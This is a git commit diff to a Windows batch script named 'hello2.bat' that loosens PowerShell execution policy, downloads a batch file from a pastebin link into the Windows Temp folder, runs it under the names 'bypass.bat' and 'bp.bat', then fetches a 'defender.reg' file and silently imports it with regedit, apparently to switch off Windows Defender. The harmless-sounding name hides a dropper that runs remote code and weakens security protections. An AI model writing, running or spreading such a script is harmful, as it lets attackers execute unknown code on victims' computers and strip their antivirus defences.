f8140c3533799bc0977304d5f4ae801339bca1de
festorex <94487372+festorex@users.noreply.github.com>
2021-11-16 21:34:38 +0100

    Update hello2.bat

--- hello2.bat
+++ hello2.bat
@@ -1,7 +1,8 @@
 @echo off
 powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
 powershell -c "curl https://pastebin.com/bxeb8rF4 -O C:\Windows\Temp\bypass.bat"
+powershell -c "curl https://pastebin.com/bxeb8rF4 -O C:\Windows\Temp\bp.bat"
 cmd /c "C:\Windows\Temp\bypass.bat"
-cmd /c "C:\Windows\Temp\bypass.bat"
+cmd /c "C:\Windows\Temp\bp.bat"
 powershell -c "curl https://pastebin.com/hYpc8qH9 -O C:\Windows\Temp\defender.reg"
 regedit /s "\Windows\Temp\defender.reg"
